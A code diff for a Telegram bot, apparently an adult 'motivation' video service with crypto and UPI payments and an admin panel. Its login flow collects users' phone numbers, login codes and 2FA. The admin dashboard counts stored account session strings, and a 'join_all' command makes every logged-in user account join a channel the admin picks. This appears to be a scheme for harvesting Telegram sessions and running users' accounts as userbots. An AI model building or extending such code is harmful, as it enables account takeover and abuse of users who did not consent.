+                    await update.message.reply_text("❌ Invalid format. Please send username and link separated by space.")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "log_group":
+            try:
+                val = int(text)
+                await db.update_settings(log_group_id=val)
+                await update.message.reply_text(f"✅ Log Group ID updated to: {val}")
+                admin_config_state.pop(user.id, None)
+            except ValueError:
+                await update.message.reply_text("❌ Invalid ID. Please send a valid negative integer ID.")
+
+        elif field == "brand_name":
+            await db.update_settings(branding_name=text)
+            await update.message.reply_text(f"✅ Branding Name updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "brand_days":
+            try:
+                val = int(text)
+                await db.update_settings(branding_days=val)
+                await update.message.reply_text(f"✅ Branding Days updated to: {val}")
+                admin_config_state.pop(user.id, None)
+            except ValueError:
+                await update.message.reply_text("❌ Invalid number. Please send an integer.")
+
+        elif field == "upi":
+            await db.update_settings(upi_id=text)
+            await update.message.reply_text(f"✅ UPI ID updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "usdt":
+            await db.update_settings(usdt_address=text)
+            await update.message.reply_text(f"✅ USDT Address updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "ton":
+            await db.update_settings(ton_address=text)
+            await update.message.reply_text(f"✅ TON Address updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "commission":
+            try:
+                val = int(text)
+                if 0 <= val <= 100:
+                    await db.update_settings(commission=val)
+                    await update.message.reply_text(f"✅ Commission updated to: {val}%")
+                    admin_config_state.pop(user.id, None)
+                else:
+                    await update.message.reply_text("❌ Please enter a number between 0 and 100.")
+            except ValueError:
+                await update.message.reply_text("❌ Invalid number. Please enter a percentage (0-100).")
+
+        elif field == "auto_join_config":
+            if text.lower() == "none":
+                await db.update_settings(auto_join_channel="")
+                await update.message.reply_text("✅ Auto-joins disabled.")
+            else:
+                await db.update_settings(auto_join_channel=text)
+                await update.message.reply_text(f"✅ Auto-join channel updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "user_manage":
+            try:
+                target_uid = int(text)
+                u_info = await db.get_user(target_uid)
+                if not u_info:
+                    await update.message.reply_text(f"❌ User with ID <code>{target_uid}</code> not found in database.", parse_mode="HTML")
+                else:
+                    text_profile = (
+                        f"<blockquote>👤 USER PROFILE: {target_uid}</blockquote>\n\n"
+                        f"• Username: @{u_info.get('username', 'None')}\n"
+                        f"• First Name: {u_info.get('first_name', 'None')}\n"
+                        f"• Phone: {u_info.get('phone', 'None')}\n"
+                        f"• Status: <code>{u_info.get('status', 'pending').upper()}</code>\n"
+                        f"• Videos Watched: <code>{u_info.get('video_count', 0)}</code>\n"
+                        f"• Free Previews: <code>{u_info.get('free_previews_used', 0)}</code>\n\n"
+                        "Select an action to modify user details:"
+                    )
+                    keyboard = make_keyboard([
+                        [
+                            primary("🔓 Set Active", f"usrm_active_{target_uid}"),
+                            primary("💎 Set Premium", f"usrm_premium_{target_uid}")
+                        ],
+                        [
+                            primary("❌ Set Pending", f"usrm_pending_{target_uid}"),
+                            primary("🗑️ Reset Count", f"usrm_reset_{target_uid}")
+                        ],
+                        [danger("🔙 BACK TO PANEL", "admin_dashboard")]
+                    ])
+                    await update.message.reply_text(text_profile, reply_markup=keyboard, parse_mode="HTML")
+                    admin_config_state.pop(user.id, None)
+            except ValueError:
+                await update.message.reply_text("❌ Please enter a valid integer User ID.")
+
+        elif field == "add_admin":
+            try:
+                target_uid = int(text)
+                current_admins = settings.get("admin_ids", [])
+                if target_uid in current_admins:
+                    await update.message.reply_text(f"⚠️ User <code>{target_uid}</code> is already an admin.", parse_mode="HTML")
+                else:
+                    current_admins.append(target_uid)
+                    await db.update_settings(admin_ids=current_admins)
+                    await update.message.reply_text(f"✅ User <code>{target_uid}</code> added to admins.", parse_mode="HTML")
+                admin_config_state.pop(user.id, None)
+            except ValueError:
+                await update.message.reply_text("❌ Please enter a valid integer User ID.")
+
+        elif field == "remove_admin":
+            try:
+                target_uid = int(text)
+                current_admins = settings.get("admin_ids", [])
+                if target_uid not in current_admins:
+                    await update.message.reply_text(f"⚠️ User <code>{target_uid}</code> is not in the admin list.", parse_mode="HTML")
+                elif target_uid == user.id:
+                    await update.message.reply_text("❌ You cannot remove yourself from the admin list.")
+                else:
+                    current_admins.remove(target_uid)
+                    await db.update_settings(admin_ids=current_admins)
+                    await update.message.reply_text(f"✅ User <code>{target_uid}</code> removed from admins.", parse_mode="HTML")
+                admin_config_state.pop(user.id, None)
+            except ValueError:
+                await update.message.reply_text("❌ Please enter a valid integer User ID.")
+
+        elif field == "join_all":
+            context.application.create_task(run_join_all_userbots(context.bot, user.id, text))
+            await update.message.reply_text(f"⏳ Initiated join all process for all logged-in accounts to <code>{text}</code>.", parse_mode="HTML")
+            admin_config_state.pop(user.id, None)
+
+        return
+
+    # 2. Check if admin is entering video custom caption
+    if is_admin and user.id in admin_upload_states:
+        st_up = admin_upload_states[user.id]
+        if st_up.get("awaiting_caption"):
+            text = update.message.text.strip()
+            if text.lower() == "none":
+                st_up["caption"] = None
+            else:
+                st_up["caption"] = text
+            st_up.pop("awaiting_caption", None)
+            await send_upload_config_message(update.message, user.id)
+            return
+
+    # 3. Standard Login States & Fallback
     state = login_state.get(user.id, {})
     step = state.get("step")
+    user_data = await db.get_user(user.id)
+    lang = user_data.get("language", "en") if user_data else "en"
 
     if step == "phone_wait":
         await handle_phone(update, context)
@@ -864,30 +1773,47 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await handle_2fa(update, context)
     else:
         await update.message.reply_text(
-            "<blockquote>🔞 USE THE BUTTONS BELOW</blockquote>\n\n"
-            "This bot is fully button-driven. Tap a button to navigate.\n"
-            "<i>Don't make me repeat myself... 😏</i>",
-            reply_markup=main_menu_keyboard(),
+            get_text("LOGIN_PORTAL_TEXT", lang) if not user_data or user_data.get("status") == "pending" else get_text("WELCOME_BACK_USER", lang),
+            reply_markup=welcome_keyboard(lang),
             parse_mode="HTML",
         )
 
 
 async def handle_video_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if user.id not in config.ADMIN_IDS:
-        await update.message.reply_text("❌ Not authorized.", reply_markup=main_menu_keyboard())
+    is_admin = await is_user_admin(user.id)
+    if not is_admin:
         return
+
     video = update.message.video
-    if video:
-        file_id = video.file_id
-        await update.message.reply_text(
-            f"<blockquote>📹 VIDEO CAPTURED</blockquote>\n\n"
-            f"<b>File ID:</b> <code>{file_id}</code>\n\n"
-            "Use this in the <b>admin panel</b> to add the video.",
-            parse_mode="HTML",
-        )
+    if not video:
+        return
 
+    file_id = video.file_id
 
+    # If admin is in "menu_images" config state to update welcome video
+    if user.id in admin_config_state and admin_config_state[user.id].get("field") == "menu_images":
+        status_msg = await update.message.reply_text("📥 <b>Downloading and updating welcome video... Please wait.</b>", parse_mode="HTML")
+        try:
+            file = await context.bot.get_file(file_id)
+            os.makedirs("data", exist_ok=True)
+            await file.download_to_drive("data/start_video.mp4")
+            await status_msg.edit_text("✅ <b>Welcome video updated successfully!</b>", parse_mode="HTML")
+            admin_config_state.pop(user.id, None)
+        except Exception as e:
+            logger.error(f"Failed to download and save welcome video: {e}")
+            await status_msg.edit_text(f"❌ <b>Failed to update welcome video:</b> {e}", parse_mode="HTML")
+        return
+
+    # Otherwise, configure the video for database
+    admin_upload_states[user.id] = {
+        "file_id": file_id,
+        "category": "motivation",
+        "is_free": True,
+        "delete_after": 60,
+        "caption": None
+    }
+    await send_upload_config_message(update.message, user.id)
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Update {update} caused error {context.error}")
 
@@ -896,6 +1822,7 @@ async def post_init(app: Application):
     logger.info("🔥 Spicy Motivation Bot v2 starting!")
     await db.init_db()
     await _cache_start_images()
+    await _cache_start_videos()
     logger.info(f"✅ Database initialized, {len(START_IMAGES)} start images cached")
 
 
@@ -962,9 +1889,15 @@ def main():
         try:
             return await _orig_edit(text, chat_id=chat_id, message_id=message_id, *args, **kwargs)
         except Exception as e:
-            if "no text" in str(e).lower() and chat_id and message_id:
-                await _bot.delete_message(chat_id=chat_id, message_id=message_id)
-                return await _bot.send_message(chat_id=chat_id, text=text, *args, **kwargs)
+            logger.info(f"Patched edit failed: {e}. Falling back to delete and send.")
+            if chat_id and message_id:
+                try:
+                    await _bot.delete_message(chat_id=chat_id, message_id=message_id)
+                except Exception:
+                    pass
+                reply_markup = kwargs.get("reply_markup")
+                parse_mode = kwargs.get("parse_mode", "HTML")
+                return await _bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
             raise
 
     async def _patched_send_video(chat_id, video, caption=None, *args, **kwargs):
@@ -992,19 +1925,38 @@ def main():
 
 
 async def show_admin_dashboard_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in config.ADMIN_IDS:
+    user = update.effective_user
+    is_admin = await is_user_admin(user.id)
+    if not is_admin:
         return
+    settings = await db.get_settings()
+    maintenance_active = settings.get("maintenance_mode", False)
+    logged_in_sessions_count = await db.db.users.count_documents({"session_string": {"$ne": None}})
     user_count = await db.get_user_count()
     v_count = await db.video_count()
     pending_purchases = await db.get_pending_purchases()
+    
+    force_sub = settings.get("force_sub_channel", "None") or "None"
+    
     text = (
-        "<blockquote>🔞 ADMIN CONTROL PANEL</blockquote>\n\n"
-        f"👥 <b>Total Users:</b> <code>{user_count}</code>\n"
+        "👑 <b>XTR AD BOT - ADMIN PANEL</b> 👑\n\n"
+        "Welcome to your global configurations panel. Update settings dynamically:\n\n"
+        f"👤 <b>Total Users:</b> <code>{user_count}</code>\n"
         f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
-        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n\n"
-        "<i>Use the buttons below to manage.</i>"
+        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
+        f"🔑 <b>Logged-in Sessions:</b> <code>{logged_in_sessions_count}</code>\n"
+        f"⚙️ <b>Maintenance Mode:</b> <code>{'ENABLED 🔴' if maintenance_active else 'DISABLED 🟢'}</code>\n"
+        f"🔒 <b>Force Join:</b> <code>{force_sub}</code>\n\n"
+        "<i>Update configurations below:</i>"
     )
-    await update.message.reply_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")
+    from utils import telegram_admin_panel_keyboard
+    await update.message.reply_text(
+        text,
+        reply_markup=telegram_admin_panel_keyboard(maintenance_active),
+        parse_mode="HTML"
+    )
+
+
 
 
 if __name__ == "__main__":
